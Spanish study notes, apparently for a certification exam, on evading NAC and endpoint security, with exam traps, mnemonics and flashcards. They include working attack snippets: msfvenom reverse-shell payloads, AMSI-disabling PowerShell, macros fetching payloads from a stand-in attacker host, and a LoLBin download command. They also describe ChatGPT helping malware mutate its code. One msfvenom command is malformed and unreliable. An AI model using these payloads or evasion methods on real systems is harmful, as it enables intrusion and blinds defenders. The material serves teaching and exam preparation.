# M12_04_EvadingNACAndEndpointSecurity

## 1. Conceptos y definiciones

### NAC y su superficie de evasión
El **Network Access Control (NAC)** intenta impedir que dispositivos no autorizados accedan a servicios internos. Su lógica es simple: antes de conceder conectividad útil, el dispositivo debe demostrar identidad, postura o ambas. El problema es que el NAC no “adivina intenciones”; toma decisiones sobre **puertos, identidad de host, VLAN asignada, estado de autenticación y flujo de tráfico**. Por eso, si el atacante consigue **heredar confianza ya concedida** o **manipular el mecanismo de segmentación**, puede moverse por la red sin romper directamente el control.

Las dos ideas nucleares de evasión de NAC en este chunk son:

- **Romper la segmentación**: el atacante no intenta autenticarse “bien”, sino obtener visibilidad o tránsito entre VLANs.
- **Aprovechar confianza preexistente**: el atacante usa un equipo ya autenticado como puente para introducir tráfico de otro dispositivo.

### 🔴 VLAN hopping
**VLAN hopping** es una técnica para acceder a tráfico o segmentos de red distintos del VLAN legítimo del atacante. En el chunk se centra en el abuso de **Dynamic Trunking Protocol (DTP)**. DTP negocia enlaces trunk entre switches; si el atacante consigue que el switch negocie un trunk con su equipo, ese enlace deja de ser un acceso simple y pasa a transportar tráfico de múltiples VLANs.

La lógica del ataque es:

1. El atacante fuerza o aprovecha un puerto configurado en **dynamic auto** o **dynamic desirable**.
2. Envía tráfico DTP para negociar un trunk.
3. Una vez levantado el trunk, el equipo atacante puede **ver o enviar tráfico de múltiples VLANs**.
4. La segmentación deja de ser una barrera efectiva porque el atacante ya no está “encerrado” en su VLAN de acceso.

El chunk también menciona el enfoque de **double tagging** con tramas **802.1Q**. Aquí el atacante inserta **dos etiquetas VLAN**: una externa y otra interna. El switch elimina la externa y, por la forma en que procesa la trama, la interna puede acabar guiando el tráfico a otra VLAN. En examen, la idea clave es que **double tagging explota el tratamiento de etiquetas VLAN**, mientras que **DTP hijacking explota la negociación de trunk**.

#### Herramientas de VLAN hopping

| Herramienta | Función real | Punto clave de examen | Sintaxis relevante |
|---|---|---|---|
| **VLANPWN** | Script para enumeración de VLAN y VLAN hopping | Framework simple con dos utilidades separadas | N/A |
| **DoubleTagging.py** | Inyección de tramas con doble etiqueta 802.1Q | Ataque de doble etiquetado, no negociación de trunk | `python3 DoubleTagging.py --interface eth0 --nativevlan 1 --targetvlan 20 --victim <IP> --attacker <IP>` |
| **DTPHijacking.py** | Envía tramas DTP “desirable” maliciosas | Convierte la máquina atacante en trunk | `python3 DTPHijacking.py --interface eth0` |

### 🔴 Uso de dispositivo preautenticado
Cuando el NAC ya ha autorizado un endpoint, ese equipo se convierte en un activo de confianza desde el punto de vista del control de acceso. El atacante evita pelear contra el NAC desde cero y usa un **dispositivo ya autenticado** como vehículo.

La lógica es de **man-in-the-middle físico o bridge controlado**:

1. El atacante obtiene acceso a un host ya autenticado.
2. Inserta su propio dispositivo entre ese host y la red/switch.
3. El tráfico pasa físicamente por el equipo del atacante.
4. El atacante “contrabandea” paquetes de otro equipo o inspecciona/manipula el flujo sin tener que autenticarse él directamente.

Este enfoque funciona porque el NAC ya tomó una decisión positiva sobre el dispositivo legítimo. El atacante **no rompe la autenticación**; **parasita una sesión o posición ya aprobada**.

#### Herramientas asociadas

| Herramienta | Función | Idea de examen |
|---|---|---|
| **nac_bypass_setup.sh** | Automatiza un escenario de bypass usando un host ya autenticado, típicamente con una Raspberry Pi y dos NIC | El requisito básico es **tener acceso a un equipo ya autenticado** |
| **FENRIR** | Bypass NAC usando dispositivo intermedio | Misma familia conceptual: reutilizar confianza existente |
| **NACkered** | Herramienta adicional de bypass NAC | Asociada a pre-auth device |
| **Silentbridge** | Puente silencioso entre host autenticado y red | La palabra “bridge” da pista del método |
| **BITM** | Enfoque inline / bridge-in-the-middle | Recalca posición entre switch y endpoint |

### Seguridad endpoint y lógica de evasión
La **endpoint security** añade controles en el host: antivirus, EDR, whitelisting, AMSI, sandboxing local, trazas ETW, análisis de memoria, etc. La lógica defensiva combina varias capas:

- **Firmas estáticas**: detectar artefactos conocidos.
- **Análisis comportamental**: vigilar llamadas API, inyección, spawning de procesos, cambios de memoria.
- **Controles de ejecución**: permitir o denegar binarios, DLLs, scripts y macros.
- **Telemetría**: ETW, hooks en memoria, inspección AMSI, análisis de sandbox.

La evasión endpoint intenta atacar precisamente esas cuatro capas: **cambiar el aspecto del artefacto**, **disfrazar la ejecución**, **apoyarse en binarios de confianza** o **cegar la telemetría**.

### Ghostwriting
**Ghostwriting** modifica la estructura interna del malware **sin alterar su funcionalidad**. La lógica es derrotar **detección basada en firma**: si el binario ya no coincide con un patrón conocido, el motor AV tiene menos probabilidades de reconocerlo.

El flujo que describe el chunk es:

1. Crear un payload, en el ejemplo un **Meterpreter reverse TCP**.
2. **Desensamblar** el ejecutable.
3. Insertar **junk code** o ensamblador arbitrario.
4. **Reensamblar** el binario.
5. Servirlo por HTTP para transferirlo a la víctima.

El punto conceptual importante es que **no cambia el objetivo operativo del malware**; cambia su **forma binaria** para que la firma deje de ser fiable.

**Comandos del chunk**:

```bash
cd /opt/ghostwriting/
sudo ./ghostwriting.sh
```

### 🔴 Application whitelisting y DLL hijacking
El **application whitelisting** permite ejecutar aplicaciones firmadas o explícitamente aprobadas. Parece una defensa fuerte, pero introduce una oportunidad: si una aplicación legítima busca DLLs según el orden de búsqueda de Windows, el atacante puede colocar una **DLL maliciosa con nombre esperado** donde el ejecutable la cargue antes que la versión legítima.

La cadena lógica es:

1. El sistema confía en el ejecutable legítimo.
2. El ejecutable busca una DLL requerida.
3. El atacante coloca una DLL maliciosa en una ruta prioritaria.
4. La aplicación aprobada carga la DLL maliciosa.
5. El código del atacante se ejecuta “bajo la sombra” de un binario confiable.

Esto permite **evasión**, **persistencia** y a veces **elevación de privilegios**. El chunk recalca que también pueden usarse **rundll32.exe**, **regsvr32.exe** y **PowerShell** para cargar DLLs maliciosas.

**Comando del chunk**:

```cmd
regsvr32.exe /s /n /u /i:"C:\path_to_malicious.dll"
```

### 🔴 Dechaining macros
Las macros de Office suelen ser un punto de entrada vigilado. El objetivo de **dechaining** es **romper la relación visible entre la macro y la acción maliciosa final**. En vez de que la macro ejecute directamente el payload, la macro delega en otros mecanismos del sistema: COM, XMLDOM, WMI, tareas programadas, registro, startup folder o descarga de contenidos.

Esto complica el análisis porque:

- En **análisis estático**, la macro parece menos directamente dañina.
- En **análisis dinámico**, la acción puede diferirse o pasar a procesos “benignos”.
- En **detección por comportamiento**, el árbol de procesos queda menos obvio y menos vinculado a Office.

#### Técnicas de dechaining del chunk

| Técnica | Qué hace | Señal de examen |
|---|---|---|
| **Spawning through ShellCOM** | Usa objetos COM, p. ej. `ShellBrowserWindow`, para lanzar procesos | Office → COM → ejecución de proceso |
| **Spawning using XMLDOM** | Descarga/carga código dentro del proceso Office usando XML/XSL | Muy asociada a `Microsoft.XMLDOM` y `transformNode` |
| **Spawning through WmiPrvse.exe** | Usa WMI para crear procesos, desligando la acción de Office | Proceso asociado: `wmiprvse.exe` |
| **Creating Scheduled Tasks** | Programa una tarea para ejecutar más tarde | Desacopla temporalmente la ejecución |
| **Registry Modification** | Crea persistencia vía run keys u otras claves | La ejecución ocurre en boot, no desde la macro |
| **Dropping Files** | Crea ficheros en Startup u otras rutas | Macro deja artefacto; ejecución posterior |
| **Downloading Content** | Descarga payloads con XMLHTTP/ADODB | Descarga + escritura en disco |
| **Embed File and Drop** | Usa `msfvenom -f vba-exe` para incrustar payload | Payload embebido en macro |

**Ejemplos relevantes del chunk**:

Spawning con ShellCOM:

```vb
Set obj = GetObject("new:C08AFD90-F2A1-11D1-8455-00A0C91F3880")
obj.Document.Application.ShellExecute "calc.exe",Null,"C:\\Windows\\System32",Null,0
```

Spawning con XMLDOM:

```vb
Set xml = CreateObject("Microsoft.XMLDOM")
xml.async = False
Set xsl = xml
xsl.load("file://|http://hacker/malicous_payload.xsl")
xml.transformNode xsl
```

Spawning con WMI:

```vb
Set objWMIService = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\cimv2")
Set objStartup = objWMIService.Get("Win32_ProcessStartup")
Set objConfig = objStartup.SpawnInstance_
Set objProcess = GetObject("winmgmts:root\cimv2:Win32_Process")
errReturn = objProcess.Create("calc.exe", Null, objConfig, intProcessID)
```

Creación de tarea programada:

```vb
Set service = CreateObject("Schedule.Service")
Call service.Connect
Call service.GetFolder("\").RegisterTaskDefinition("AVUpdateTask", td, 6, , , 3)
```

Drop en Startup:

```vb
Path = CreateObject("WScript.Shell").SpecialFolders("Startup")
Set objFSO = CreateObject("Scripting.FileSystemObject")
Set objFile = objFSO.CreateTextFile(Path & "\sample.bat", True)
objFile.Write "notepad.exe" & vbCrLf
objFile.Close
```

Descarga de contenido:

```vb
Dim xHttp: Set xHttp = CreateObject("Microsoft.XMLHTTP")
Dim bStrm: Set bStrm = CreateObject("Adodb.Stream")
xHttp.Open "GET", "https://the.earth.li/~sgtatham/putty/latest/w64/putty.exe", False
xHttp.Send
With bStrm
 .Type = 1
 .Open
 .write xHttp.responseBody
 .savetofile Environ("APPDATA") & "\sample.exe", 2
End With
```

Embebido con Metasploit:

```bash
msfvenom -p "GET", generic/custom PAYLOADFILE=/home/user1/Downloads/calc.exe -a x64 --platform windows -f vba-exe
```

### Clearing memory hooks
Los EDR colocan **hooks en memoria** para observar llamadas sensibles y construir análisis de comportamiento. El hook es, en la práctica, un punto de interceptación: cuando el proceso llama a una función relevante, el EDR recibe telemetría o altera el flujo para inspección.

La evasión consiste en **unhooking**:

1. Identificar DLLs y syscalls afectados.
2. Detectar qué funciones están hookeadas.
3. Restaurar en memoria los **bytes originales**.
4. Dejar la DLL del EDR presente en disco, pero sin puntos efectivos de interceptación en memoria.

La consecuencia clave es que el EDR puede seguir “instalado”, pero pierde visibilidad donde antes interceptaba llamadas. El chunk menciona **x64dbg** como herramienta para identificar syscalls hookeadas.

También añade una variante más agresiva: usar **syscalls propios o assembly propio**. En ese caso, el atacante no pasa por las rutas exportadas que suelen estar hookeadas, con lo que la telemetría del EDR puede no dispararse.

### 🔴 Process injection
**Process injection** introduce código malicioso en la memoria de un proceso ya en ejecución. El razonamiento defensivo que explota el atacante es claro: muchos controles confían más en procesos legítimos o monitorizan menos su estado interno que la creación de binarios nuevos.

Cadena típica del ataque:

1. Elegir un proceso destino.
2. Reservar memoria en su espacio de direcciones.
3. Escribir el payload en esa memoria.
4. Crear un hilo remoto para ejecutarlo.

Funciones API clave:

| API | Papel exacto | Qué suele preguntar el examen |
|---|---|---|
| **VirtualAllocEx()** | Reserva memoria en el proceso remoto | “¿Qué función asigna memoria en el proceso objetivo?” |
| **WriteProcessMemory()** | Escribe el payload en esa memoria | “¿Qué API escribe código en otro proceso?” |
| **CreateRemoteThread()** | Crea un hilo remoto para ejecutar el payload | “¿Qué función dispara la ejecución?” |

La lógica de examen suele ir por **orden funcional**: primero asignar, luego escribir, luego ejecutar.

### 🔴 LoLBins (Living off the Land Binaries)
Los **LoLBins** son binarios legítimos del sistema operativo o de proveedores de confianza. La evasión consiste en usar herramientas “normales” para acciones maliciosas, reduciendo la anomalía observable. El EDR ve la ejecución de un binario firmado y común; si la lógica de detección depende mucho de reputación o allowlisting, el atacante gana margen.

En el escenario del chunk:

1. Se genera un agente en **Deimos C2** configurado para HTTPS.
2. El payload se sube a un servidor HTTP externo.
3. **ConfigSecurityPolicy.exe** descarga el payload.
4. **CustomShellHost.exe** ejecuta el payload reemplazando `Explorer.exe` por una aplicación personalizada.

**Comandos relevantes**:

```cmd
C:\> ConfigSecurityPolicy.exe <http://example.com/payload>
C:\> CustomShellHost.exe
```

El detalle más preguntable no es Deimos C2, sino que **LoLBins = binarios legítimos usados para fines maliciosos**.

### CPL side-loading
Los **.cpl** son applets del Panel de Control. La evasión consiste en esconder o empaquetar ejecución maliciosa dentro de algo que Windows asocia con una función administrativa legítima. Esto baja sospecha tanto para el usuario como para algunos mecanismos de detección.

La técnica puede basarse en:

- Crear o adaptar un `.cpl` malicioso.
- Renombrar DLL dañinas como `.cpl`.
- Registrar o situar el archivo en un punto desde el que Windows o una app confiable lo carguen.
- Abusar de `DllEntryPoint` incluso si el archivo no cumple estrictamente con todo lo esperado de un CPL legítimo.

La idea clave es **side-loading**: el atacante no siempre ejecuta el CPL directamente; consigue que otro proceso o componente confiable lo cargue.

#### Flujo con CPLResourceRunner

1. Generar un payload staged con Cobalt Strike en formato x86.
2. Convertirlo a shellcode con `ConvertShellcode.py`.
3. Codificar el shellcode en Base64 y prepararlo para recursos.
4. Copiar el resultado a `Resources.txt`.
5. Construir el `.cpl` malicioso usando `CPLResourceRunner.dll`.

**Comando del chunk**:

```bash
cat shellcode.txt | sed 's/[, ]//g; s/0x//g;' | tr -d '\n' | xxd -p -r | gzip -c | base64 > b64shellcode.txt
```

### Uso de ChatGPT como apoyo a evasión
El chunk presenta ChatGPT como **facilitador de polimorfismo** y de generación dinámica de código. El concepto examinable no es “ChatGPT hackea”, sino **cómo un LLM podría ayudar a mutar payloads, generar funciones bajo demanda o convertir código en texto/formatos menos estáticos**.

La lógica ofensiva descrita es:

1. Obtener funciones concretas (búsqueda de ficheros, cifrado, inyección, etc.).
2. Integrar el acceso a ChatGPT o a código generado dinámicamente en el malware.
3. Validar que la función recibida hace lo esperado.
4. Ejecutarla con intérprete embebido, p. ej. Python, usando `compile()`, `exec()` o `eval()`.
5. Eliminar el código recibido o mutarlo de nuevo.

Por qué esto complica la detección:

- El binario puede guardar **menos artefactos estáticos**.
- El malware puede comportarse como **polimórfico**.
- Parte de la lógica llega como **texto** y no como binario preexistente.
- Puede cambiar API calls o estructura para evitar patrones repetibles.

El chunk subraya además la relación con **AMSI**, indicando que scripts Python sigilosos podrían dificultar esa inspección.

### Metasploit templates para bajar detección AV
Aquí la idea es que el payload generado por `msfvenom` puede ser demasiado reconocible. Al modificar la **plantilla** (`template.c`) y recompilar, el atacante cambia la estructura del ejecutable resultante y puede disminuir la tasa de detección.

Cadena del chunk:

1. Generar `Windows.exe` con `msfvenom`.
2. Medir detección en VirusTotal.
3. Reducir tamaño del payload en `template.c` (de 4096 a 4000 en el ejemplo).
4. Compilar `evasion.exe` con MinGW.
5. Regenerar payload usando la plantilla modificada.
6. Volver a medir la detección.

**Comandos relevantes**:

```bash
msfvenom -p windows/shell_reverse_tcp lhost=<Target IP Address> lport=444 -f exe > /home/attacker/Windows.exe
```

```c
#include <stdio.h>
#define SCSIZE 4000
char payload[SCSIZE] = "PAYLOAD:";
char comment[512] = "";
int main(int argc, char **argv) { (*(void (*) () ) payload) (); return(0); }
```

```bash
i686-w64-mingw32-gcc template.c -lws2_32 -o evasion.exe
```

```bash
msfvenom -p windows/shell_reverse_tcp lhost=<Target IP Address> lport=444 -x framework/data/templates/src/pe/exe/evasion.exe -f exe > /home/attacker/bypass.exe
```

### 🔴 AMSI (Antimalware Scan Interface) y su bypass
**AMSI** es una API de Windows que permite que aplicaciones y antimalware cooperen en el análisis de contenido potencialmente malicioso, especialmente scripts y contenido en memoria. Es una capa de inspección entre el código interpretado y el motor antimalware.

La evasión AMSI busca una de estas cuatro cosas:

1. **No pasar por AMSI**.
2. **Ofuscar** lo que AMSI inspecciona.
3. **Corromper** su estado interno para que falle.
4. **Manipular** su flujo para que devuelva limpio.

#### Técnicas del chunk

| Técnica | Mecanismo | Dato clave de examen |
|---|---|---|
| **PowerShell downgrade** | Ejecutar PowerShell 2.0 para evitar AMSI moderno | Comando: `powershell -version 2` |
| **Obfuscation** | Romper cadenas y recomponerlas | Ejemplo clásico con `Invoke-Mimikatz` |
| **Forcing an error** | Alterar `AmsiUtils` para que AMSI falle en inicialización | Cambia contexto/sesión internos |
| **Memory hijacking** | Hookear `AmsiScanBuffer()` para devolver `AMSI_RESULT_CLEAN` | AMSI “ve” malware pero responde limpio |

**Comandos del chunk**:

Downgrade:

```powershell
powershell -version 2
```

Ofuscación:

```powershell
Invoke-Mimikatz "Inv"+"o"+"ke"+"-Mimi"+"katz"
```

Forzar error:

```powershell
$mem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(9076)
[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiSession","NonPublic,Static").SetValue($null, $null)
[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiContext","NonPublic,Static").SetValue($null, [IntPtr]$mem)
```

Memory hijacking:

```powershell
[System.Reflection.Assembly]::LoadFile("<Path to ASBBypass.dll file>")
[Amsi]::Bypass()
```

### Otras técnicas de evasión endpoint
Este bloque final es muy preguntable porque mezcla varias familias de evasión. El truco es **entender qué capa se está evadiendo**.

#### Hosting phishing sites on popular infrastructure
Aquí se evade principalmente **reputación/blacklisting**. Si el EDR bloquea IPs maliciosas conocidas, alojar phishing o C2 en **AWS o Google Cloud** reduce la probabilidad de bloqueo por reputación. La clave no es que la nube sea mágica, sino que **su infraestructura legítima no suele estar en listas negras globales**.

También menciona **esteganografía en redes sociales**: el código o instrucciones se ocultan en imágenes o multimedia y malware ya residente las extrae. Eso ayuda a camuflar C2 o distribución.

#### Passing encoded commands
Se busca ocultar el contenido del comando a motores simples de detección. El ejemplo del chunk usa **Base64** para esconder un `Invoke-WebRequest` que descarga y ejecuta un payload. Lo importante para examen: **codificar no es cifrar de forma fuerte**; sirve sobre todo para ofuscar o evitar firmas triviales.

#### 🔴 Fast flux DNS
El **fast flux** cambia rápidamente **IPs y nombres DNS** y se apoya a menudo en botnets o nodos comprometidos que actúan como reverse proxies. El objetivo es:

- dificultar el bloqueo por IP;
- ocultar el C2 real;
- aumentar resiliencia frente a takedown;
- evadir blacklists.

La pista de examen es que el cliente comprometido **no conecta necesariamente al C2 real**, sino a nodos intermedios cambiantes.

#### 🔴 Timing-based evasion
Es evasión de **sandbox** o análisis temporal. El malware retrasa su comportamiento hasta una hora, evento o interacción concreta: `sleep`, delay APIs, time bombs, reboot, clics del usuario. Si el sandbox observa pocos segundos, el payload parece inerte.

#### Signed binary proxy execution
Se apoya en **binarios firmados y de confianza** para ejecutar código malicioso por proxy. La idea está emparentada con LoLBins, pero aquí el énfasis es el **proxy execution mediante binario firmado**. El ejemplo citado es `rundll32`.

#### Shellcode encryption
El shellcode se cifra con **XOR, RC4 o AES** y se descifra en memoria justo antes de ejecutarse. El objetivo es debilitar firmas estáticas. En examen, asocia esta técnica con **shellcode oculto hasta el momento de uso**.

#### Reducing entropy
Muchos binarios maliciosos o empaquetados tienen entropía alta. Reducirla metiendo recursos o strings de baja entropía busca que el archivo se parezca menos a un artefacto empaquetado o cifrado. La palabra clave es **hacer el binario menos sospechoso estadísticamente**.

#### Escaping the local AV sandbox
Se aprovecha de que algunos EDR/AV observan el binario solo durante pocos segundos. Si la parte realmente dañina se retrasa —por ejemplo, complicando el descifrado o usando cálculos largos— el sandbox agota su ventana de análisis.

#### 🔴 Disabling ETW
**Event Tracing for Windows (ETW)** es una gran fuente de telemetría para EDR, especialmente Microsoft Defender for Endpoint. El chunk destaca el parcheo de `EtwEventWrite` en `ntdll.dll` para que devuelva éxito sin registrar eventos útiles. La lógica es **cegar la telemetría en userland**.

#### 🔴 Direct system calls y “Mark of the Syscall”
Los EDR suelen hookear funciones en `ntdll.dll`. Si el atacante evita esas funciones y llama directamente a syscalls del kernel —por ejemplo usando el ID de syscall— reduce la visibilidad del hook. La clave de examen es distinguir:

- **VirtualAlloc**: API de alto nivel más visible.
- **NtAllocateVirtualMemory**: equivalente más cercano a kernel, típico en bypass.
- `syscall <id>` directo: evasión más agresiva de hooks.

#### Spoofing the thread call stack
Cuando un beacon duerme, su hilo puede delatarse porque la dirección de retorno apunta al shellcode. El atacante intercepta `Sleep()`, sobrescribe temporalmente la return address (por ejemplo con `0x0`), llama al `Sleep()` original y luego restaura la dirección real. Así rompe la asociación directa entre **thread return address** y **shellcode**.

#### In-memory encryption of beacon
Durante el periodo de reposo del beacon, el shellcode en memoria se cifra —en el chunk, con XOR— y se descifra al despertar. La idea es esquivar **memory scanning** mientras el implante está dormido. El patrón mental correcto es: **dormido = shellcode cifrado; activo = shellcode restaurado**.

---

## 2. Exam Traps ⚠️

⚠️ **[VLAN hopping]** El examen puede mezclar **double tagging** con **DTP spoofing/hijacking** como si fueran la misma técnica. No lo son. **Double tagging** explota etiquetas **802.1Q** dobles; **DTP hijacking** explota la **negociación de trunk** mediante DTP.

⚠️ **[Pre-authenticated device]** La trampa típica es hacer pensar que el atacante “rompe” NAC criptográficamente. En este chunk, el punto correcto es que **reutiliza un dispositivo ya autenticado** y coloca su equipo entre el host legítimo y la red.

⚠️ **[Ghostwriting]** Puede confundirse con cifrado o packers. Aquí la clave no es cifrar el payload, sino **modificar su estructura binaria sin cambiar funcionalidad**, insertando junk code para evadir firmas.

⚠️ **[Application whitelisting]** La pregunta puede presentar el whitelisting como defensa absoluta. La respuesta correcta es que puede ser burlado mediante **DLL hijacking**, aprovechando el orden de búsqueda de DLLs de Windows y el contexto de una app legítima firmada.

⚠️ **[Dechaining macros]** El examen puede poner una macro que no ejecuta directamente el payload y sugerir que no hay explotación real. Error: si la macro delega en **WMI, tareas programadas, COM, XMLDOM, registro o Startup**, sigue siendo ejecución maliciosa desacoplada.

⚠️ **[WMI spawning]** Si aparece `wmiprvse.exe`, la confusión habitual es pensar en persistencia o administración remota legítima. En este contexto, se usa para **spawn de procesos** desligando la acción del proceso Office.

⚠️ **[Process injection]** Suelen cambiar el orden de las APIs. El orden lógico correcto es **VirtualAllocEx() → WriteProcessMemory() → CreateRemoteThread()**.

⚠️ **[LoLBins]** El examen puede describir un binario firmado de Windows descargando o ejecutando payloads y preguntar por “troyanización” o “BYOVD”. En este chunk eso corresponde a **LoLBins**, porque se abusa de herramientas legítimas ya presentes o confiables.

⚠️ **[CPL side-loading]** Puede parecer simple renombrado de DLL. El matiz correcto es que el atacante busca que el `.cpl` o DLL renombrada sea **cargada por un componente confiable o por la lógica del Panel de Control**, no solo cambiarle la extensión.

⚠️ **[ChatGPT]** La trampa es conceptual: el examen no evalúa “usar IA” como técnica autónoma, sino **su utilidad para polimorfismo, mutación de código, generación de funciones y evasión de patrones estáticos**.

⚠️ **[Metasploit templates]** Pueden preguntar por qué baja la detección tras tocar `template.c`. La respuesta correcta es que **se altera la forma del ejecutable generado**, reduciendo coincidencias con firmas, no que Metasploit “desactive” el antivirus.

⚠️ **[AMSI PowerShell downgrade]** La confusión típica es pensar que bajar PowerShell mejora compatibilidad. En este contexto, se hace para **evitar AMSI** ejecutando **PowerShell 2.0**.

⚠️ **[AMSI obfuscation]** El examen puede mostrar una cadena troceada con concatenaciones y preguntar por cifrado. No es cifrado fuerte; es **ofuscación** para que AMSI o firmas no vean la cadena exacta.

⚠️ **[AMSI forcing an error]** Si aparece manipulación de `AmsiUtils`, `amsiSession` o `amsiContext`, la respuesta correcta no es “hooking de API”, sino **forzar un error interno de inicialización/estado de AMSI**.

⚠️ **[Memory hijacking de AMSI]** Si se hookea `AmsiScanBuffer()` para devolver `AMSI_RESULT_CLEAN`, la técnica correcta es **memory hijacking / hook de la función de análisis**, no downgrade.

⚠️ **[Fast flux DNS]** Puede mezclarse con round-robin o CDN. El rasgo diferencial es el uso ofensivo de **rotación rápida de IPs/nombres y nodos comprometidos** para ocultar C2 y evadir listas negras.

⚠️ **[Timing-based evasion]** Si el malware espera a un clic, a un reboot o a un tiempo concreto, eso apunta a **evasión de sandbox basada en tiempo o evento**, no necesariamente a persistencia.

⚠️ **[Signed binary proxy execution]** El examen puede usar `rundll32` y hacer dudar entre LoLBin general y proxy execution. Aquí la clave es que el binario firmado **actúa como intermediario para ejecutar el código malicioso**.

⚠️ **[Reducing entropy]** No es compresión ni limpieza del binario; es **manipular características estadísticas** para parecer menos empaquetado o menos cifrado.

⚠️ **[ETW]** Si la pregunta menciona parchear `EtwEventWrite` en `ntdll.dll`, la respuesta correcta es **disabling/patching ETW userland telemetry**, no AMSI.

⚠️ **[Direct syscalls]** Puede confundirse con process injection. El objetivo aquí no es meter código en otro proceso, sino **evitar hooks en `ntdll.dll` y reducir telemetría del EDR**.

⚠️ **[Spoofing thread call stack]** Si se modifica temporalmente la return address durante `Sleep()`, el propósito es **ocultar el origen shellcode del hilo en memoria**, no cifrar el payload.

⚠️ **[In-memory encryption of beacon]** Si el implante cifra su memoria solo mientras duerme y la restaura al activarse, eso es **evasión frente a memory scanning**, no persistencia ni ofuscación estática de fichero.

--

## 3. Nemotécnicos

### NAC
- **“HOP = Hago trunk O Paso VLAN”**  
  - **DTP hijacking** → hago **trunk**.  
  - **Double tagging** → paso a otra **VLAN** por etiquetas.

- **“Pre-auth = prestada la confianza”**  
  Si el dispositivo ya está autenticado, el atacante no convence al NAC: **toma prestada su confianza**.

### Process injection
- **“A-E-E: Asignar, Escribir, Ejecutar”**  
  - `VirtualAllocEx()` = **Asignar** memoria  
  - `WriteProcessMemory()` = **Escribir** payload  
  - `CreateRemoteThread()` = **Ejecutar**

### Dechaining macros
- **“Macro no mata, delega”**  
  La macro rara vez hace la acción final. **COM, XMLDOM, WMI, Task Scheduler, Registry, Startup** hacen el trabajo sucio.

- **“COM llama, XML trae, WMI lanza, Task espera”**  
  Resume la función típica de cada técnica.

### AMSI
- **“AMSI: evitar, ofuscar, romper, mentir”**  
  - **Evitar** → downgrade PowerShell 2  
  - **Ofuscar** → trocear strings  
  - **Romper** → forzar error con `AmsiUtils`  
  - **Mentir** → hook a `AmsiScanBuffer()` devolviendo `CLEAN`

### EDR / telemetría
- **“Hook, Trace, Sleep”**  
  - **Hook** → clearing memory hooks  
  - **Trace** → ETW patching  
  - **Sleep** → spoofed stack + beacon cifrado durante reposo

### Entropía y sandbox
- **“Alta entropía canta; ejecución tardía escapa”**  
  - Entropía alta = sospechoso  
  - Ejecución tardía = evade sandbox corto

### Fast flux
- **“Flux = IPs fluidas”**  
  Si las IPs cambian rápido, piensa en fast flux y ocultación del C2.

### LoLBins y signed proxy execution
- **“LoL usa lo legítimo; proxy firmado ejecuta por ti”**  
  Ambos usan confianza previa, pero el segundo enfatiza que un binario firmado **proxya** la ejecución del código malicioso.

---

## 4. Flashcards

**Q:** ¿Cuál es la diferencia fundamental entre VLAN hopping por double tagging y por DTP hijacking?  
**A:** Double tagging explota tramas con dos etiquetas 802.1Q para alcanzar otra VLAN; DTP hijacking explota la negociación de trunk mediante DTP para obtener acceso a múltiples VLANs.

**Q:** ¿Qué modos de switch facilitan el establecimiento de un trunk en el escenario de VLAN hopping descrito?  
**A:** `dynamic auto` y `dynamic desirable`.

**Q:** ¿Qué herramienta del chunk está diseñada específicamente para ejecutar un ataque de doble etiquetado VLAN?  
**A:** `DoubleTagging.py`.

**Q:** ¿Qué script convierte la máquina del atacante en un trunk channel mediante una trama DTP-desirable maliciosa?  
**A:** `DTPHijacking.py`.

**Q:** ¿Cuál es el requisito básico para un bypass NAC usando un pre-authenticated device?  
**A:** Tener acceso a un dispositivo que ya haya sido autenticado por el NAC.

**Q:** ¿Qué arquitectura física suele usarse en el bypass NAC con un dispositivo preautenticado?  
**A:** Colocar un dispositivo del atacante, como una Raspberry Pi con dos adaptadores de red, entre el switch y el host autenticado.

**Q:** ¿Qué persigue Ghostwriting en términos de evasión?  
**A:** Modificar la estructura del malware sin alterar su funcionalidad para evadir detección basada en firmas.

**Q:** ¿Qué hace `ghostwriting.sh` después de desensamblar un binario?  
**A:** Inserta junk code o ensamblador arbitrario y luego reconstruye el ejecutable.

**Q:** ¿Cómo puede el application whitelisting terminar ejecutando una DLL maliciosa?  
**A:** Mediante DLL hijacking, colocando una DLL con el nombre esperado en una ruta prioritaria del orden de búsqueda de Windows.

**Q:** ¿Qué utilidad de Windows menciona el chunk para ejecutar una DLL maliciosa en un escenario de evasión por whitelisting?  
**A:** `regsvr32.exe`.

**Q:** ¿Qué significa “dechaining” en el contexto de macros maliciosas?  
**A:** Desacoplar la macro del payload final delegando la ejecución en otros componentes como COM, WMI, tareas programadas, registro o Startup.

**Q:** ¿Qué componente COM se usa en el ejemplo de spawning through ShellCOM?  
**A:** `ShellBrowserWindow` a través del objeto creado con `GetObject("new:C08AFD90-F2A1-11D1-8455-00A0C91F3880")`.

**Q:** ¿Qué proceso aparece asociado al spawning de procesos mediante WMI en este chunk?  
**A:** `wmiprvse.exe`.

**Q:** ¿Qué dos librerías/objetos VBScript aparecen en el ejemplo de descarga de contenido desde macro?  
**A:** `Microsoft.XMLHTTP` y `Adodb.Stream`.

**Q:** ¿Cuál es la secuencia correcta de APIs en un process injection clásico?  
**A:** `VirtualAllocEx()` → `WriteProcessMemory()` → `CreateRemoteThread()`.

**Q:** ¿Qué función API asigna memoria en el espacio de direcciones de un proceso remoto?  
**A:** `VirtualAllocEx()`.

**Q:** ¿Qué función API escribe el payload dentro del proceso remoto?  
**A:** `WriteProcessMemory()`.

**Q:** ¿Qué función API inicia la ejecución del payload inyectado en el proceso remoto?  
**A:** `CreateRemoteThread()`.

**Q:** ¿Qué son los LoLBins?  
**A:** Binarios legítimos del sistema o de fuentes confiables usados por atacantes para ejecutar acciones maliciosas evitando levantar sospechas.

**Q:** ¿Qué binario se usa en el chunk para descargar un payload remoto en el escenario LoLBins?  
**A:** `ConfigSecurityPolicy.exe`.

**Q:** ¿Qué binario se usa para ejecutar el payload reemplazando `Explorer.exe` por una aplicación personalizada?  
**A:** `CustomShellHost.exe`.

**Q:** ¿Cuál es la idea principal del CPL side-loading?  
**A:** Conseguir que código malicioso contenido o disfrazado como `.cpl` sea cargado por un componente confiable o por la lógica del Panel de Control.

**Q:** ¿Qué herramienta menciona el chunk para construir archivos CPL maliciosos a partir de shellcode y recursos?  
**A:** `CPLResourceRunner`.

**Q:** ¿Qué aporta ChatGPT al malware según este chunk?  
**A:** Generación/mutación de código, polimorfismo, creación de funciones bajo demanda y reducción de patrones estáticos detectables.

